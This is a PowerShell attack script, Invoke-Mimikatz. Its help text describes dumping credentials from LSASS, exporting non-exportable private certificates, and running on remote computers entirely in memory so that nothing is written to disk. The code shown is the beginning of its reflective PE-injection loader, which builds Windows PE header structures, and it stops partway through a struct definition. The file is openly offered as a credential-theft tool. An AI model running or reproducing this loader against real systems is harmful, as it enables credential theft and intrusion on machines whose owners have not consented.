function Invoke-Mimikatz
{
<#
.SYNOPSIS

This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
dump credentials without ever writing the mimikatz binary to disk. 
The script has a ComputerName parameter which allows it to be executed against multiple computers.

This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.

Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Mimikatz version: 2.1 20161126 ()

.DESCRIPTION

Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
functionality provided with Mimikatz.

.PARAMETER DumpCreds

Switch: Use mimikatz to dump credentials out of LSASS.

.PARAMETER DumpCerts

Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).

.PARAMETER Command

Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.
    
.EXAMPLE

Execute mimikatz on the local computer to dump certificates.
Invoke-Mimikatz -DumpCerts

.EXAMPLE

Execute mimikatz on two remote computers to dump credentials.
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")

.EXAMPLE

Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"

.NOTES
This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com

.LINK

http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
#>

[CmdletBinding()]
Param(
    [Parameter(ParameterSetName = "Command", Position = 0, Mandatory = $true)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $false)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $PEBytes32,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 3, Mandatory = $false)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [String]
        $ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
    )
    
    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
